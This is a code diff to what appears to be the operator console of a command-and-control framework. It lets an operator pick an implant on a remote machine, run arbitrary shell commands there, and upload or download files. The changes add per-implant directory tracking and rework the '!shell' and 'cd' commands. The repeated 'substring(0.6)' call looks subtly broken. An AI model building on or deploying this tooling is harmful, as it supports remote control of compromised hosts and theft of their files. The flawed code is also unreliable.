@@ -37,8 +37,12 @@ function executeCommand(cmd){
         cmdArray.splice(1, 0, vars.globalOptions.implant);
         cmdArray[0]="!implants";
     }
+    if(cmdArray[0].toLowerCase() == "!shell"){
+        cmdArray.splice(1, 0, "implant");
+        cmdArray[0]="!setg";
+    }
     if (cmdArray[0].toLowerCase() == "cd"){
-        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: vars.globalOptions.path, cmd: "cd /d "+cmdArray.slice(1).join(" ")+" &&   chdir"}});
+        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: vars.paths[vars.globalOptions.implant.substring(0.6)], cmd: "cmd /C \"FOR /F %i IN (\"\""+cmdArray.slice(1).join(" ")+"\"\") DO IF EXIST %~fi (echo %~fi)\"", cd:true}});
     }
     else if (cmdArray[0].toLowerCase() == "!options"){
         printOptions();
@@ -95,7 +99,7 @@ function executeCommand(cmd){
         filename = arr[arr.length-1];
         console.log(filename);
         fileService.create({filename: filename, chunkSize: parseInt(vars.globalOptions.chunksize), length: 0, metadata:{path:cmdArray[1], uploadedBy: vars.implants[vars.globalOptions.implant]._id }}).then(function(file){
-            createJob(vars.globalOptions.implant, {type:"Upload", options:{ file: cmdArray[1], file_id: file._id, chunkSize: parseInt(vars.globalOptions.chunksize), path: vars.globalOptions.path}});
+            createJob(vars.globalOptions.implant, {type:"Upload", options:{ file: cmdArray[1], file_id: file._id, chunkSize: parseInt(vars.globalOptions.chunksize), path: vars.paths[vars.globalOptions.implant.substring(0.6)]}});
         }).catch((err) => {
             term.printError(err.message);return;
         });
@@ -110,7 +114,7 @@ function executeCommand(cmd){
     else if (cmdArray[0].toLowerCase() == "!put"){
         if(vars.files[cmdArray[1]] != undefined ||  cmdArray.length < 2){
             var file = cmdArray[2] ? cmdArray[2] : vars.files[cmdArray[1]].filename;
-            createJob(vars.globalOptions.implant, {type:"Download", options:{ file: file, file_id: vars.files[cmdArray[1]]._id, length: vars.files[cmdArray[1]].length, chunkSize: vars.files[cmdArray[1]].chunkSize, path: vars.globalOptions.path}});
+            createJob(vars.globalOptions.implant, {type:"Download", options:{ file: file, file_id: vars.files[cmdArray[1]]._id, length: vars.files[cmdArray[1]].length, chunkSize: vars.files[cmdArray[1]].chunkSize, path: vars.paths[vars.globalOptions.implant.substring(0.6)]}});
         }else{
             term.printError("\r\n File not found");
         }
@@ -205,7 +209,18 @@ function executeCommand(cmd){
         }
     }
     else if (cmdArray[0].toLowerCase() == "!setg" && cmdArray.length > 2){
-        vars.globalOptions[cmdArray[1].toLowerCase()] = cmdArray[2];     
+        if(cmdArray[1].toLowerCase() == "implant"){
+            if(vars.implants[cmdArray[2]]){
+                vars.globalOptions["implant"] = cmdArray[2];
+                if(vars.paths[cmdArray[2]] == undefined){
+                    vars.paths[cmdArray[2]] = ".";
+                }
+            }else{
+                term.printError("Implant not found");
+            }
+        }else{
+            vars.globalOptions[cmdArray[1].toLowerCase()] = cmdArray[2];
+        }         
     }else if (cmdArray[0].toLowerCase() == "!set" && cmdArray.length > 2){
         if(vars.moduleOptions[cmdArray[1].toLowerCase()] !== undefined){
             if(cmdArray[1].toLowerCase() == "implant"){
@@ -228,13 +243,11 @@ function executeCommand(cmd){
             vars.moduleOptions[cmdArray[1].toLowerCase()] = {value: cmdArray[2], required: false};
         }     
 }
-    else if (cmdArray[0].toLowerCase() == "!shell" && cmdArray.length > 1){
-        vars.globalOptions["implant"]= cmdArray[1];     
-    }else if (cmdArray[0].toLowerCase() == "!back"){
+    else if (cmdArray[0].toLowerCase() == "!back"){
         vars.globalOptions["implant"]= "";     
     }
     else if(cmdArray[0].length > 0 && cmd[0] != "!"){
-        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: vars.globalOptions.path, cmd: cmd}});
+        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: vars.paths[vars.globalOptions.implant.substring(0.6)], cmd: cmd}});
     }else{
         term.printError("Invalid command, type !help for assistance");
     }
